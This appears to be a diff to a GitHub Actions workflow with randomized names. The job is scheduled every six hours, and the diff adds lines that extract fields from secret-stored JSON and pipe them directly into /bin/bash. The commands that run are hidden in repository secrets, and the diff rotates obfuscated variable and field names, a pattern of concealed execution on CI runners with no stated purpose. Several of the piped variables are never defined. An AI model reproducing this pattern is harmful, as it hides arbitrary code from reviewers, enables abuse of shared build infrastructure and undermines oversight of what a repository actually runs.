@@ -2,7 +2,7 @@ name: wznkhi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 3/6 * * *'
+    - cron: '13 0/6 * * *'
 
 jobs:
   build:
@@ -11,20 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: wznkhi
         env:
-          ede229: ${{ secrets.ede229 }}
+          pfuwb200: ${{ secrets.pfuwb200 }}
         run: |
-          echo $ede229 | jq -r .rfv0401 | /bin/bash
-          echo $qlw0630 | jq -r .e886 | /bin/bash
-          echo $gdjm7732 | jq -r .bvj44 | /bin/bash
-          echo $x75 | jq -r .xl82692 | /bin/bash
-          echo $hnwam17400 | jq -r .erqnv294 | /bin/bash
-          echo $i624 | jq -r .qcao2 | /bin/bash
-          echo $q786 | jq -r .albn7609 | /bin/bash
-          echo $pydoe18 | jq -r .gfy454 | /bin/bash
-          echo $uuhsa01 | jq -r .rgk27 | /bin/bash
-          echo $xsceo4248 | jq -r .kj1315 | /bin/bash
-          echo $knv5 | jq -r .py86 | /bin/bash
-          echo $iicww62495 | jq -r .e6 | /bin/bash
-          echo $sbhdu5 | jq -r .b0 | /bin/bash
-          echo $hljsk53 | jq -r .whe08427 | /bin/bash
+          echo $pfuwb200 | jq -r .axtwl08 | /bin/bash
+          echo $m26 | jq -r .mzl366 | /bin/bash
+          echo $yxl933 | jq -r .bh6608 | /bin/bash
+          echo $qbwn3012 | jq -r .b1709 | /bin/bash
+          echo $zv06 | jq -r .mho582 | /bin/bash
+          echo $lume3 | jq -r .s3 | /bin/bash
+          echo $sab63 | jq -r .gr36 | /bin/bash
+          echo $u0 | jq -r .ryp0 | /bin/bash
 
